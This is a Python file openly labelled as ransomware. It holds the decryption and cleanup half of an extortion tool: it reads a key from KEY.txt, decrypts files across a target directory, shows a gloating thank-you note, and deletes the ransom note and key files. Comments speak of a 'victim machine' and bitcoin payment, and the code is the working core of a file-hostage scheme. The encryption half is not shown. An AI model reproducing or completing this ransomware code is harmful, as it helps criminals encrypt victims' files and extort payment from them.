# Imports
from cryptography.fernet import Fernet # encrypt/decrypt files on target system
import os # to get system root
import webbrowser # to load webbrowser to go to specific website eg bitcoin
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import subprocess # to create process for notepad and open ransom  note
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading # used for ransom note and decryption key on dekstop



class RansomWare:


    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None

        ''' Root directorys to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
            CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
        '''
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.localRoot = '/home/git'


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def decrypt_file(self, file_path):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            # Decrypt data from file
            _data = self.crypter.decrypt(data)
            # Log file decrypted and print decrypted contents - [debugging]
            print(f'> File decrypted: {file_path}')
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def decrypt_system(self):
        system = os.walk(f'{self.localRoot}', topdown=True)
        print(self.localRoot)
        for root, dir, files in system:
            for file in files:
                if file == "UFF" or file == "RANSOM_NOTE.txt" or file == "KEY.txt" or file == "THANK_YOU.txt" or file == "EMAIL_ME.txt":
                    continue
                file_path = os.path.join(root, file)
                self.decrypt_file(file_path)


    def thank_you_note(self):
        with open(f'{self.localRoot}/THANK_YOU.txt', 'w') as f:
            f.write(f'''
    All your files have been decrypted!

    Remember, the most important thing in life is participating, not winning.

    I am the only one who gets to win ;)
''')


    def show_thank_you_note(self):
        # Open the ransom note
        subprocess.Popen(['gedit', f'{self.localRoot}/THANK_YOU.txt'])
        time.sleep(5)
        os.remove(f'{self.localRoot}/RANSOM_NOTE.txt')
        os.remove(f'{self.localRoot}/KEY.txt')
        os.remove(f'{self.localRoot}/THANK_YOU.txt')
        os.remove(f'{self.localRoot}/EMAIL_ME.txt')

    
    # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
    def decrypt(self):
        try:
            with open(f'{self.localRoot}/KEY.txt', 'r') as f:
                self.key = f.read()
                self.crypter = Fernet(self.key)
                # Decrpyt system once have file is found and we have cryptor with the correct key     
                print("GOT THE KEY!")
                self.decrypt_system()
                print('decrypted') # Debugging/Testing
        except Exception as e:
            print(e) # Debugging/Testing



def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    rw.decrypt()
    rw.thank_you_note()
    rw.show_thank_you_note()

if __name__ == '__main__':
    main()
 
